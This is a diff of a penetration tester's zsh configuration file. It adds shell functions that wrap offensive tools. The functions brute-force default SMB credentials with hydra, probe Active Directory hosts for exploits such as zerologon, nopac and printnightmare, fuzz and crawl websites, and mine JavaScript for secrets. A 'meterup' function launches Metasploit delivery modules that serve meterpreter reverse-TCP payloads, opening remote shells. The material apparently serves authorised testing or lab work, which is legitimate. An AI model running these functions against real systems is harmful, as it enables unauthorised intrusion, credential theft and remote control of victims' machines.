@@ -506,23 +506,10 @@ nscan(){
         nxc smb $1 -u '' -p '' --local-auth --port $2
         nxc smb $1 -u 'Guest' -p '' --local-auth --port $2
 
-        read -r resp\?"DO YOU WANT TO TEST SMBCLIENT BINDINGS? (Y/N): "
+        read -r resp\?"DO YOU WANT TO CHECK DEFAULT CREDENTIALS? (Y/N): "
         if [[ $resp =~ [Yy] ]]; then
-            echo -e "\nSTANDARD CHECK\n"
-            smbclient -p $2 -N -L $1
-            smbclient -p $2 -U 'Guest%' -L $1
-
-            echo -e "\nLANMAN1 CHECK\n"
-            smbclient -p $2 -N -L $1 --option="client min protocol=LANMAN1"
-            smbclient -p $2 -U 'Guest%' -L $1 --option="client min protocol=LANMAN1"
-
-            echo -e "\nNT1 CHECK\n"
-            smbclient -p $2 -N -L $1 --option="client min protocol=NT1"
-            smbclient -p $2 -U 'Guest%' -L $1 --option="client min protocol=NT1"
+            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/smb-betterdefaultpasslist.txt smb://$1:$2
         fi
-
-        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
-        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/smb-betterdefaultpasslist.txt smb://$1:$2
 
         echo -e "\nMSF VERSION FINGERPRINT\n"
         msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $1; set RPORT $2; exploit; exit" 
@@ -539,6 +526,9 @@ nscan(){
         
             echo -e "\nPASSWORD POLICY\n"
             nxc smb "$1" -u "$user" -p "$pass" --port "$2" --pass-pol
+
+            echo -e "\nCVE SEARCH (AD)"
+            nxc smb "$1" -u "$user" -p "$pass" --port "$2" -M ms17-010 -M smbghost -M zerologon -M nopac -M printnightmare -M remove-mic
         
             echo -e "\nDOWNLOAD POSSIBLE FILES\n"
             nxc smb "$1" -u "$user" -p "$pass" --port "$2" -M spider_plus -o DOWNLOAD_FLAG=True
@@ -626,47 +616,202 @@ gcc_ex(){
     gcc -L/home/damuna/gsl/lib $1 -O1 -g -lgmp -lm -lgsl -lgslcblas
 }
 
+# HTTP Tech Scanning function
+techscan(){
+        echo -e "------------TECHNOLOGY SCANNING \"$1\"----------------"
+        host=$(echo $1 | unfurl format %d)
+        port=$(echo $1 | unfurl format %P)
 
-# Content Discovery --> (Directories, Files, Backups)
-dirfuzz(){
+        echo -e "\nSERVER HEADER\n"
+        curl -kIL $1
+
+        echo -e "\nDEFAULT ALLOWED METHODS\n"
+        curl -kILX OPTIONS $1
+
+        if [[ $(echo $1 | unfurl format %s) == "https" ]]; then 
+            if [[ -z $port ]]; then
+                port=443
+            fi
+            echo -e "\nTESTING WITH SSLYZE / HEARTBLEED\n"
+            sslyze $host:$port
+            Heartbleed $1
+        else
+            if [[ -z $port ]]; then
+                port=80
+            fi
+        fi
+
+        echo -e "\nCHECKING IF VULNERABLE TO SHORT-SCANNING...\n"
+        chk=$(sns -u $1 --check | grep -v "Target is not vulnerable")
+        if [[ ! -z $chk ]]; then
+            echo -e "TARGET IS VULNERABLE, DISCOVERING PATHS VIA SNS"
+            sns -u $1 -s -t 25
+        fi
+
+        echo -e "\nFINGERPRINTING VIA HTTPX\n"
+        echo $1 | httpx -random-agent -fr -mc 200 -silent -sc -server -title -cdn -cname
+
+        echo -e "\nCHECKING WAF PRESENCE\n"
+        wafme0w -t $1 --no-warning --concurrency 15
+
+        echo -e "\nTECHNOLOGY SCANNING\n"
+        whatweb -a 3 $1
+
+        read -r pub\?"IS THE DOMAIN BEHIND CLOUDFLARE? (Y/N): "
+        if [[ $pub =~ [Yy] ]]; then
+            echo -e "\nCHECKING UNCOVERING & PUBLIC SUBDOMAINS\n"
+            /home/kali/TOOLS/CloakQuest3r/venv/bin/python3 /home/kali/TOOLS/CloakQuest3r/cloakquest3r.py $host
+        fi
+
+        echo -e "\nNUCLEI HTTP SCANNING\n"
+        nuclei -up &>/dev/null && nuclei -ut &>/dev/null
+        nuclei -rl 15 -silent -t http/ -u $1
+
+        echo -e "\nNIKTO & NMAP SCANNING\n"
+        sudo nmap -Pn -sV --script="http-enum","http-vuln-*","http-webdav-*","http-tplink-*","http-svn-*","http-trace","http-shellshock","http-put","http-ntlm-*","http-methods","http-iis-*","http-git","http-drupal-*","http-errors","http-cors","http-config-*","http-comments-*","ssl-*","http-apache-*" -p$port $host
+        nikto -h $host:$port -Tuning b
+}
+
+crawl(){
+        echo -e "------------------WEB CRAWLING----------------------\n"
+        dom=$(echo $1 | unfurl format %d)
+
+        read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY=VAL2): "
+        if [[ -z $cookie ]]; then
+            cookie="rand=rand"
+        fi
+        echo -e "\nGATHERING ENDPOINTS\n"
+        gospider --no-redirect --cookie "$cookie" -t 5 -s $1 --sitemap -d 3 --subs --js > /tmp/crawled_$dom.txt
+        cat /tmp/crawled_$dom.txt | grep -E "\[href\]|\[url]" | grep -vE "\.css|\.js$|\.woff|\.woff2|\.ttf|\.png|\.jpg|\.jpeg|\.gif|\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -vif /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
+
+        echo -e "\nQUERY STRINGS\n"
+        cat /tmp/crawled_$dom.txt | grep -E "\[href\]|\[url]" | grep -E "\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | qsreplace FUZZ | awk '!seen[$0]++'
+
+        echo -e "\nFORM FIELDS\n"
+        cat /tmp/crawled_$dom.txt | grep -E "form\]" | grep -vE "\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++'
+
+        echo -e "\nSUBDOMAINS\n"
+        cat /tmp/crawled_$dom.txt | grep -E "\[subdomains\]" | awk -F" " '{print $3}' | awk '!seen[$0]++'
+
+        echo -e "\nJS FILES\n"
+        cat /tmp/crawled_$dom.txt | grep -E "\[javascript\]" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' > /tmp/jstmp_$dom.txt
+        while read line; do
+            type=$(curl -s $line -I | grep -i Content-Type | awk -F" " '{print $2}' | head -n 1)
+            if [[ $type =~ "javascript" ]]; then
+                echo $line | anew -q /tmp/js_$dom.txt
+            fi
+        done < /tmp/jstmp_$dom.txt
+
+        echo -e "\nEXTRACTING COMMENTS\n"
+        ReconSpider.py $1 &>/dev/null
+        cat results.json | jq '.comments[]'
+
+        echo -e "\nEXTRACING E_MAILS\n"
+        cat results.json | jq '.emails[]'
+
+        echo -e "\nJS LINK MINING\n"
+        cat /tmp/crawled_$dom.txt | grep -E "\[linkfinder\]" | awk -F" " '{print $6}' | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -v "www.w3.org" | grep -v "reactjs.org" | grep -v "mui.com"
+
+        echo -e "\nJS SECRET MINING\n"
+        cat /tmp/js_$dom.txt | while read line; do; /home/kali/TOOLS/SecretFinder/venv/bin/python3 ~/TOOLS/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done
+
+        echo -e "\nBROKEN LINK 404 HIJACKING\n"
+        blc -ro -f -i --filter-level 2 -g $1 | grep -i HTTP_404
+}
+# Extension Selector Function
+select_extension() {
+  local options=(
+    [1]='.php,.inc,.txt,.html'
+    [2]='.asp,.aspx,.ashx,.asmx'
+    [3]='.jsp,.java,.class,.do,.action,.war'
+    [4]='.cgi,.pl,.bat,.sh,.cmd'
+    [5]='.log,.txt,.json,.xml,.html,.js,.pcap'
+    [6]='.pem,.scr.,.der,.cert,.key,.crt,.pfx'
+    [7]='.bak,.old,.tmp,.env,.wadl,.git'
+    [8]='.zip,.tar,.tar.gz,.gz,.7z,.rar,.bz2,.gzip,.sqlite,.sql,.db,.kbdx'
+    [9]='.vhd,.vmdk,.vhdx,.img,.iso'
+    [10]='.doc,.docx,.xls,.xlsx,.pdf,.ppt,.odt,.ost'
+    [11]='.exe,.dll,.jar,.apk'
+  )
+
+  print -P "%F{blue}Select file extension group:%f"
+  for k v in "${(@kv)options}"; do
+    print -P "%F{green}$k)%f $v"
+  done
+
+  local choice
+  while true; do
+    read -r "choice?Enter your choice [1-${#options}]: "
+    case $choice in
+      [1-5])
+        ext=$options[$choice]
+        print -P "%F{green}Selected:%f $ext"
+        return 0
+        ;;
+      6)
+        read -r "ext?Enter custom extensions (comma-separated): "
+        print -P "%F{green}Custom set:%f $ext"
+        return 0
+        ;;
+      *)
+        print -P "%F{red}Invalid selection! Please try again.%f"
+        ;;
+    esac
+  done
+}
+
+
+# File Discovery
+filefuzz(){
+    echo -e "-----------------FILE FUZZING------------------\n"
+    dom=$(echo $1 | unfurl format %d)
     read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
-    if [[ -z $cookie ]]; then   
+    if [[ -z $cookie ]]; then
         cookie="rand=rand"
     fi
 
-    # Unique merge of quickhits.txt, dirsearch dicc.txt, big.txt, svndigger/all.txt, common.txt, raft-small-*, backup_files_only
-    echo -e "\nSEARCHING GENERIC CONTENT\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 503,400,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ -c -w ~/WORDLISTS/common_content.txt | while read line; do echo $1/$line; done
-
-    echo -e "\nSEARCHING RAFT DIRECTORIES\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | while read line; do echo $1/$line/; done
-
     echo -e "\nSEARCHING RAFT FILES\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt | while read line; do echo $1/$line; done
+    ffuf -H "Cookie: $cookie" -s -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt | while read line; do echo $1/$line; done
 
-    echo -e "\nCHECKING NUCLEI HTTP EXPOSURES\n"
+    echo -e "\nSEARCHING GENERIC FILES\n"
+    ffuf -H "Cookie: $cookie" -s -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w ~/WORDLISTS/common_content.txt | while read line; do echo $1/$line; done
+
+    echo -e "\nNUCLEI FILE EXPOSURE\n"
     nuclei -up &>/dev/null && nuclei -ut &>/dev/null
-    nuclei -rl 5 -silent -u $1 -t http/exposures -H "Cookie: $cookie"
+    nuclei -rl 15 -silent -u $1 -t http/exposures -H "Cookie: $cookie"
 
-    echo -e "\nSMALL DIRECTORY SEARCH\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ/ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | while read line; do echo $1/$line; done
-
-    echo -e "\nCOMPREHENSIVE DIRECTORY SEARCH\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | while read line; do echo $1/$line; done
-
-    echo -e "\nCHECKING HTTPARCHIVE FILES\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ -c -w ~/WORDLISTS/httparchive_files.txt | while read line; do echo $1/$line; done
-
-    read -r ext\?"INPUT COMMA-SEPARATED EXTENSIONS FOR EXT-FUZZING (php,txt,html,js,asp,aspx,json,xml,bak,jsp,do,action...): "
-    echo $ext | tr ',' '\n' > /tmp/ext_$(echo $1 | unfurl format %d).txt
-    echo -e "\nSEARCHING GENERATED + EXTENDED DIRECTORIES/FILES\n"
+    select_extension
+    echo -e "\nPERFORMING EXTENSION FUZZING\n"
     urlgen $1
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ/ -c -w /tmp/endpoints_$(echo $1 | unfurl format %d).txt | while read line; do echo $1/$line; done
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ1.FUZZ2 -c -w /tmp/endpoints_$(echo $1 | unfurl format %d).txt:FUZZ1 -w /tmp/ext_$(echo $1 | unfurl format %d).txt:FUZZ2 | while read line; do echo $1/$line; done
-
-    echo -e "\nPERFORMING EXTENDED FILE FUZZING\n"
-    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic  -u $1/FUZZ1.FUZZ2 -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt:FUZZ1 -w /tmp/ext_$(echo $1 | unfurl format %d).txt:FUZZ2 | while read line; do echo $1/$line; done
+    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /tmp/endpoints_$dom.txt -e $ext | while read line; do echo $1/$line; done
+    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt -e $ext | while read line; do echo $1/$line; done
 }
+
+# Directory Discovery
+dirfuzz(){
+    echo -e "-----------------DIRECTORY FUZZING------------------\n"
+    read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
+    if [[ -z $cookie ]]; then
+        cookie="rand=rand"
+    fi
+    echo -e "\nSEARCHING COMBINED DIRECTORIES\n"
+    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,404,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt | while read line; do echo $1/$line/; done
+
+    echo -e "\nSEARCHING COMBINED WORDS\n"
+    ffuf -H "Cookie: $cookie" -s -mc all -fc 400,404,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt | while read line; do echo $1/$line/; done
+}
+
+# TMUX Parallel Web Enumerator
+webenum() {
+  dom=$(openssl rand -hex 12)
+  tmux new-session -d -s $dom -n "$1" "source ~/.zshrc; techscan $1; read"
+  tmux split-window -v -t $dom "source ~/.zshrc; crawl $1; read"
+  tmux split-window -h -t $dom:0.0 "source ~/.zshrc; dirfuzz $1; read"
+  tmux split-window -h -t $dom:0.1 "source ~/.zshrc; filefuzz $1; read"
+  tmux select-layout -t $dom tiled
+  tmux attach -t $dom
+}
+
 
 
 apifuzz(){
@@ -734,7 +879,7 @@ smbserv(){
     usr=$(echo $creds | cut -d ":" -f1)
     psw=$(echo $creds | cut -d ":" -f2)
     if [[ ! -z $creds ]]; then
-        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:{$usr} {$psw} \n copy n:\\[FILE]\n"
+        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:$usr $psw \n copy n:\\[FILE]\n"
         smbserver.py -ip $ip -user $usr -password $psw -smb2support share $(pwd)
     else
         echo -e "\nCONNECT WITH: copy \\\\\\$ip\\share\\[FILE]\n"
@@ -745,8 +890,8 @@ smbserv(){
 
 webdavserv(){
     chnic
-    echo -e "\nOPENING WEBDAV AT http://$ip:8000\n FROM /tmp"
-    wsgidav --host=$ip --port=8000 --root=$(pwd) --auth=anonymous
+    echo -e "\nOPENING WEBDAV AT http://$ip:8001\n FROM /tmp"
+    wsgidav --host=$ip --port=8001 --root=$(pwd) --auth=anonymous
 }
 # Created by `pipx` on 2024-09-26 13:58:11
 export PATH="$PATH:/home/damuna/.local/bin"
@@ -757,22 +902,12 @@ paramfuzz(){
 }
 
 ligcreate(){
-    sudo ip tuntap add user `whoami` mode tun $1 2>/dev/null
-    sudo ip link set $1 up 2>/dev/null
-}
-
-# web enumeration
-webenum(){
-    #host=$(echo $1 | unfurl format %d)
-    
-    echo "\n-------------------Curl--------------------\n"
-    curl -kIL $1
-    echo "\n------------------whatweb------------------\n"
-    whatweb $1
-    echo "\n-------------WAF detection------------\n"
-    wafw00f $1
-    echo "\n----------------Nikto scanner--------------\n"
-    nikto -h $1 -Tuning b
+    echo -e "ligcreate [NOME_INTERFACCIA] [ROUTE_INTERFACCIA]"
+    usr=$(whoami)
+    sudo ip tuntap add user $usr mode tun $1
+    sudo ip link set $1 up
+    sudo ip route add $2 dev $1
+    sudo ip route add 240.0.0.1/32 dev $1
 }
 
 # Password spraying
@@ -812,6 +947,7 @@ vhost(){
     ffuf -mc all -ac -acs advanced -u $1 -c -w "$wd:FUZZ" -H "Host: FUZZ.$host" "${@:2}"
 }
 
+
 #Crawling/JS Scraping Function
 crawl(){
         dom=$(echo $1 | unfurl format %d)
@@ -842,16 +978,22 @@ crawl(){
             fi
         done < /tmp/jstmp_$dom.txt
 
+        echo -e "\nEXTRACTING COMMENTS\n"
+        ReconSpider.py $1 &>/dev/null
+        cat results.json | jq '.comments[]'
+
+        echo -e "\nEXTRACING E_MAILS\n"
+        cat results.json | jq '.emails[]'
+
         echo -e "\nJS LINK MINING\n"
         cat /tmp/crawled_$dom.txt | grep -E "\[linkfinder\]" | awk -F" " '{print $6}' | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -v "www.w3.org" | grep -v "reactjs.org" | grep -v "mui.com"
 
         echo -e "\nJS SECRET MINING\n"
-        cat /tmp/js_$dom.txt | while read line; do; /home/damuna/TOOLS/SecretFinder/venv/bin/python3 ~/TOOLS/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done
+        cat /tmp/js_$dom.txt | while read line; do; ~/TOOLS/SecretFinder/venv/bin/python3 ~/TOOLS/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done
         rm /tmp/js*
-
-        echo -e "\nEXTRACTING COMMENTS\n"
-        ReconSpider.py $1 &>/dev/null
-        cat results.json | jq '.comments[]'
+        
+        echo -e "\nBROKEN LINK 404 HIJACKING\n"
+        blc -ro -f -i --filter-level 2 -g $1 | grep -i HTTP_404
 }
 
 
@@ -884,9 +1026,8 @@ dnsrec(){
 
 # Ligolo proxy
 ligstart(){
-    sudo ip tuntap add user `whoami` mode tun ligolo 2>/dev/null
-    sudo ip link set ligolo up 2>/dev/null
-    ligolo-proxy -selfcert
+    mkdir ./LIGOLO_DATA && cd ./LIGOLO_DATA
+    sudo ligolo-proxy -selfcert
 }
 
 # Default credentials for services / applications
@@ -1117,23 +1258,57 @@ addhost() {
     grep "^$ip" /etc/hosts
 }
 
+
 # AD Realm Setting Function
 krbconf(){
-    echo "krbconf [IP_DC] [DC_HOSTNAME] [DOMAIN]"
-    echo -e "\nCONFIGURING HOSTS\n"
-    addhost $1 $2.$3
-    addhost $1 $3
-    echo "# --- DOMAIN \"$3\" CONFIGURATION ---" | sudo tee -a /etc/resolv.conf
-    echo "domain $3" | sudo tee -a /etc/resolv.conf
-    echo "nameserver $1" | sudo tee -a /etc/resolv.conf
+    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
+    if [[ $1 =~ $cidr_regex ]]; then
+        genhosts $1
 
-    echo -e "\nSYNCING TIME WITH \"$2.$3\"\n"
+        echo -e "\nSEARCHING DC IP IN \"$1\"\n"
+        dc_ip=$(sudo nmap -p88 $1 --open -oN - | grep "open" | cut -d' ' -f2)
+        if [[ -z $dc_ip ]]; then
+            echo "DC WAS NOT FOUND IN \"$1\", SKIPPING REALM CONFIGURATION"
+            return 1
+        fi
+    fi
+
+    echo -e "\nSYNCING TIME WITH DC \"$1\"\n"
     sudo timedatectl set-ntp off
-    sudo ntpdate -s $2.$3
-    sudo rdate -n $2.$3
+    sudo ntpdate -s $1
+    sudo rdate -n $1
 
-    echo -e "\nCREATING KERBEROS REALM FOR DOMAIN \"$3\"\n"
-    sudo python3 ~/.local/bin/configure_krb5.py $3 $2
+    genhosts $1
+    echo -e "\nADDING AD REALM AND NAMSERVER FOR DC \"$1\"\n"
+    nxc smb $1 --generate-krb5-file /tmp/krb5conf
+    dom=$(cat /tmp/krb5conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
+    domchk=$(cat /etc/resolv.conf | grep "domain $dom")
+    if [[ -z $domchk ]]; then
+        echo "#---AD GENERATED---#\ndomain $dom\nnameserver $dc_ip" | sudo tee --append /etc/resolv.conf
+    fi
+
+    if [[ -f /etc/krb5.conf ]]; then
+        prev_dom=$(cat /etc/krb5.conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
+        if [[ ! -z $prev_dom && $prev_dom != $dom ]]; then
+            cat /tmp/krb5conf | tail -n 2 | sudo tee --append /etc/krb5.conf
+            rlm=$(cat /tmp/krb5conf | grep -i { -A4)
+            sudo awk -v text="$chk" '/\[realms\]/ {print; print "" text; next} 1' /etc/krb5.conf > tmp && sudo mv tmp /etc/krb5.conf
+        else
+            sudo mv /tmp/krb5conf /etc/krb5.conf
+        fi
+    else
+        sudo mv /tmp/krb5conf /etc/krb5.conf
+    fi
+}
+
+# AD Host Mapping generator
+genhosts(){
+    echo -e "\nFINDING AND MAPPING AD HOSTNAMES IN \"$1\"\n"
+    nxc smb $1 --generate-hosts-file /tmp/hostsfile
+    while read line; do
+        grep -qxF $line /etc/hosts || echo $line | sudo tee --append /etc/hosts
+    done < /tmp/hostsfile
+    rm /tmp/hostsfile
 }
 
 # SQLMap Scan Wrapper
@@ -1318,3 +1493,144 @@ pfx2key(){
     echo "\n SAVED ${filename%.*}.key and ${filename%.*}.crt"
 }
     
+# Meterpreter Upgrade Windows Generator
+meterup(){
+    chnic
+    read -r mtd\?"SELECT DELIVERY METHOD (smb, http, webdav): "
+    read -r arch\?"SELECT ARCHITECTURE (32, 64): "
+    pl=""
+    if [[ $arch == "32" ]]; then
+        pl="/"
+    fi
+    if [[ $arch == "64" ]]; then
+        pl="/x64/"
+    fi
+    if [[ $mtd == "smb" ]]; then
+        sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
+    fi
+
+    if [[ $mtd == "http" ]]; then
+        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LHOST $nic; set SRVHOST $nic; run"
+    fi
+
+    if [[ $mtd == "webdav" ]]; then
+        sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
+    fi
+}
+
+# vhd vmsk vhdx Mounter
+vhdMount() {
+    if [[ $# -eq 0 ]]; then
+        echo "Usage: vhdMount <File>"
+        echo "To unmount: vhdMount -u"
+        return 1
+    fi
+
+    # Unmount if -u flag is passed
+    if [[ "$1" == "-u" ]]; then
+        echo "Unmounting VHD..."
+        sudo umount /mnt/my_vhs 2>/dev/null
+        sudo vgchange -an 2>/dev/null
+        sudo kpartx -d /dev/nbd0 2>/dev/null
+        sudo qemu-nbd -d /dev/nbd0 2>/dev/null
+        sudo rmmod nbd 2>/dev/null
+        sudo rm -f /var/lock/qemu-nbd-nbd0 2>/dev/null
+        echo "Unmount complete"
+        return 0
+    fi
+
+    # Mounting procedure
+    echo "Mounting VHD: $1"
+    
+    # Cleanup any existing mounts first
+    sudo umount /mnt/my_vhs 2>/dev/null
+    sudo vgchange -an 2>/dev/null
+    sudo kpartx -d /dev/nbd0 2>/dev/null
+    sudo qemu-nbd -d /dev/nbd0 2>/dev/null
+    sudo rmmod nbd 2>/dev/null
+    sudo rm -f /var/lock/qemu-nbd-nbd0 2>/dev/null
+    
+    # Setup new mount
+    sudo mkdir -p /mnt/my_vhs
+    sudo modprobe nbd max_part=16
+    
+    # Connect to NBD device
+    if ! sudo qemu-nbd -r --connect=/dev/nbd0 "$1"; then
+        echo "Failed to connect to NBD device"
+        echo "Trying alternative approach..."
+        sudo qemu-nbd -r -c /dev/nbd0 "$1" || {
+            echo "Error: Could not connect $1 to /dev/nbd0"
+            return 1
+        }
+    fi
+    
+    # Wait for device to be ready
+    sleep 2
+    
+    # Check if device exists
+    if [[ ! -b /dev/nbd0 ]]; then
+        echo "Error: /dev/nbd0 block device not created"
+        return 1
+    fi
+    
+    # Create partition mappings
+    if ! sudo kpartx -av /dev/nbd0; then
+        echo "Error: Failed to create partition mappings"
+        sudo qemu-nbd -d /dev/nbd0
+        return 1
+    fi
+    
+    # Wait for partitions to appear
+    sleep 2
+    
+    # Try to mount the first partition automatically
+    if [[ -b /dev/mapper/nbd0p1 ]]; then
+        if sudo mount -t ntfs-3g /dev/mapper/nbd0p1 /mnt/my_vhs 2>/dev/null; then
+            echo "Successfully mounted to /mnt/my_vhs"
+            return 0
+        else
+            echo "Mount failed, trying alternative methods..."
+            # Try mounting as read-only
+            if sudo mount -t ntfs-3g -o ro /dev/mapper/nbd0p1 /mnt/my_vhs 2>/dev/null; then
+                echo "Mounted as read-only to /mnt/my_vhs"
+                return 0
+            fi
+        fi
+    fi
+    
+    # If automatic mount failed
+    echo "Could not automatically mount partition."
+    echo "Available devices:"
+    ls /dev/nbd0* /dev/mapper/nbd0* 2>/dev/null || echo "No devices found"
+    
+    echo "You can try mounting manually with:"
+    echo "sudo mount -t ntfs-3g /dev/mapper/nbd0pX /mnt/my_vhs"
+    echo "Or for read-only access:"
+    echo "sudo mount -t ntfs-3g -o ro /dev/mapper/nbd0pX /mnt/my_vhs"
+    return 1
+}
+
+# Bitlocker Mounting
+bitmount(){
+    if [[ $# -eq 0 ]]; then;
+        echo -e "\nUsage: bitmount [FILE] [PWD]\n"
+        return 1
+    fi
+    echo -e "\nCLEANING UP PREVIOUS DISKS\n"
+    sudo rm -rf /media/bitlocker /media/bitlockermount
+    for loop_device in $(losetup --all | grep "$1" | cut -d ':' -f 1)
+    do
+        echo "Detaching ${loop_device}..."
+        sudo losetup -d "${loop_device}"
+    done
+
+    echo -e "\nMOUNTING \"$1\" WITH PASSWORD \"$2\"\n"
+    sudo mkdir -p /media/bitlocker; sudo mkdir -p /media/bitlockermount
+    sudo losetup -f -P $1
+    disk=$(losetup --all | grep "$1" | awk '{print $1}' | head -n 1 | tr -d ':')
+    sudo dislocker ${disk}p1 -u$2 -- /media/bitlocker
+    sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+
+    echo -e "\nCD AND LISTING CONTENT\n"
+    cd /media/bitlockermount && sudo ls -la .
+}
